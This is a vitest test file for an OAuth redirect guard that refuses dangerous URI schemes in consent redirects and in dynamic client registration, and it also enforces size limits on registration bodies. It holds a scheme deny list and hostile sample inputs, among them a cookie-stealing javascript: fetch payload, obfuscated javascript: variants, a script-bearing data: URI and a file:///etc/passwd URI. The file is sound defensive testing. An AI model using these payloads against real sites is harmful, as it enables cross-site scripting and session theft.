/**
 * Which redirect targets an OAuth client may have (../oauthRedirect.ts): the
 * consent page follows any absolute URL but the denied schemes, and client
 * registration refuses a client naming one before better-auth stores it.
 */

import { describe, expect, it, vi } from 'vitest';
import {
  DCR_BODY_MAX_BYTES,
  DCR_CLIENT_NAME_MAX,
  DCR_REGISTER_PATH,
  DCR_URI_FIELDS,
  DCR_URI_MAX,
  DENIED_REDIRECT_SCHEMES,
  isAllowedRedirectTarget,
  rejectUnsafeDynamicClientRegistration,
} from '../oauthRedirect.ts';

describe('isAllowedRedirectTarget', () => {
  it.each([
    ['an https callback', 'https://claude.ai/api/mcp/auth_callback?code=abc&state=s'],
    ['a loopback http callback', 'http://127.0.0.1:52111/callback'],
    ['a localhost callback', 'http://localhost:33418/callback?code=abc'],
    ['a native app scheme', 'cursor://anysphere.cursor-retrieval/oauth/callback?code=abc'],
    ['a reverse-domain native scheme', 'com.example.app:/oauth2redirect?code=abc'],
    ['an error redirect', 'https://client.example/cb?error=access_denied&state=s'],
  ])('follows %s', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(true);
  });

  it('denies exactly the five schemes', () => {
    expect(DENIED_REDIRECT_SCHEMES).toEqual([
      'javascript:',
      'data:',
      'vbscript:',
      'blob:',
      'file:',
    ]);
  });

  it.each([
    ['javascript:', "javascript:fetch('//x/'+document.cookie)"],
    ['javascript: in mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript: split by a tab', 'java\tscript:alert(1)'],
    ['javascript: after leading spaces', '  javascript:alert(1)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['blob:', 'blob:https://app.classmoji.io/1b4e28ba-2fa1-11d2-883f-0016d3cca427'],
    ['file:', 'file:///etc/passwd'],
  ])('refuses %s', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(false);
  });

  it.each([
    ['a relative path', '/settings'],
    ['a scheme-relative URL', '//elsewhere.example/cb'],
    ['a bare word', 'callback'],
    ['an empty string', ''],
  ])('refuses %s (a redirect URI is absolute)', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(false);
  });

  it.each([[null], [undefined], [42], [{}], [['https://x.example']]])(
    'refuses a non-string (%o)',
    target => {
      expect(isAllowedRedirectTarget(target)).toBe(false);
    }
  );
});

describe('rejectUnsafeDynamicClientRegistration', () => {
  const ORIGIN = 'http://localhost:3000';
  const register = (body: unknown, path = DCR_REGISTER_PATH) =>
    new Request(`${ORIGIN}${path}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: typeof body === 'string' ? body : JSON.stringify(body),
    });

  it('lets a client with only followed redirect URIs through', async () => {
    const request = register({
      redirect_uris: ['http://127.0.0.1:33418/callback', 'cursor://anysphere.cursor-retrieval/cb'],
    });
    expect(await rejectUnsafeDynamicClientRegistration(request)).toBeNull();
    // The body is still there for better-auth.
    expect(await request.json()).toMatchObject({ redirect_uris: expect.any(Array) });
  });

  it.each([['javascript:alert(1)'], ['blob:https://x.example/1'], ['file:///x'], ['/relative']])(
    'refuses a client naming %s among its redirect URIs',
    async uri => {
      const res = await rejectUnsafeDynamicClientRegistration(
        register({ redirect_uris: ['https://ok.example/cb', uri] })
      );
      expect(res?.status).toBe(400);
      expect(await res!.json()).toMatchObject({ error: 'invalid_redirect_uri' });
    }
  );

  it('refuses a non-string redirect URI', async () => {
    const res = await rejectUnsafeDynamicClientRegistration(register({ redirect_uris: [42] }));
    expect(res?.status).toBe(400);
  });

  it.each([
    ['no redirect_uris', { client_name: 'x' }],
    ['redirect_uris not a list', { redirect_uris: 'javascript:alert(1)' }],
    ['a body that is not JSON', 'not json'],
  ])('leaves %s to better-auth', async (_label, body) => {
    expect(await rejectUnsafeDynamicClientRegistration(register(body))).toBeNull();
  });

  describe('sizes', () => {
    const ok = 'https://client.example/cb';
    const tooLarge = async (request: Request) => {
      const res = await rejectUnsafeDynamicClientRegistration(request);
      expect(res?.status).toBe(400);
      expect(await res!.json()).toMatchObject({ error: 'invalid_client_metadata' });
    };

    it('lets a registration at every limit through', async () => {
      const fields = Object.fromEntries(
        DCR_URI_FIELDS.map(field => [
          field,
          `https://client.example/${'u'.repeat(DCR_URI_MAX - 'https://client.example/'.length)}`,
        ])
      );
      for (const value of Object.values(fields)) expect(value.length).toBe(DCR_URI_MAX);
      expect(
        await rejectUnsafeDynamicClientRegistration(
          register({
            client_name: 'N'.repeat(DCR_CLIENT_NAME_MAX),
            redirect_uris: [`${ok}?${'q'.repeat(DCR_URI_MAX - ok.length - 1)}`],
            ...fields,
          })
        )
      ).toBeNull();
    });

    it('refuses a client_name over the limit', async () => {
      await tooLarge(
        register({ client_name: 'N'.repeat(DCR_CLIENT_NAME_MAX + 1), redirect_uris: [ok] })
      );
    });

    it.each(DCR_URI_FIELDS)('refuses a %s over the limit', async field => {
      await tooLarge(
        register({ redirect_uris: [ok], [field]: `https://c.example/${'u'.repeat(DCR_URI_MAX)}` })
      );
    });

    it.each(['redirect_uris', 'post_logout_redirect_uris'])(
      'refuses a URI in %s over the limit',
      async field => {
        await tooLarge(
          register({ redirect_uris: [ok], [field]: [ok, `${ok}?${'q'.repeat(DCR_URI_MAX)}`] })
        );
      }
    );

    it('refuses a body over the limit, by its declared length before reading it', async () => {
      const request = new Request(`${ORIGIN}${DCR_REGISTER_PATH}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'content-length': String(DCR_BODY_MAX_BYTES + 1),
        },
        body: JSON.stringify({ redirect_uris: [ok] }),
      });
      const clone = vi.spyOn(request, 'clone');
      await tooLarge(request);
      expect(clone).not.toHaveBeenCalled();
    });

    it('refuses a body over the limit without a declared length (many fields)', async () => {
      const contacts = Array.from(
        { length: 300 },
        (_, i) => `person${i}@${'x'.repeat(60)}.example`
      );
      const body = JSON.stringify({ redirect_uris: [ok], contacts });
      expect(body.length).toBeGreaterThan(DCR_BODY_MAX_BYTES);
      await tooLarge(register(body));
    });
  });

  // The 1.4 path is mapped to the registration path before the guard runs
  // (the webapp's api.auth.$; its own test pins the order).
  it.each([
    ['/api/auth/oauth2/authorize'],
    ['/api/auth/mcp/register'],
    ['/api/auth/sign-up/email'],
  ])('does not look at %s (only the registration path)', async path => {
    expect(
      await rejectUnsafeDynamicClientRegistration(
        register({ redirect_uris: ['javascript:alert(1)'] }, path)
      )
    ).toBeNull();
  });
});
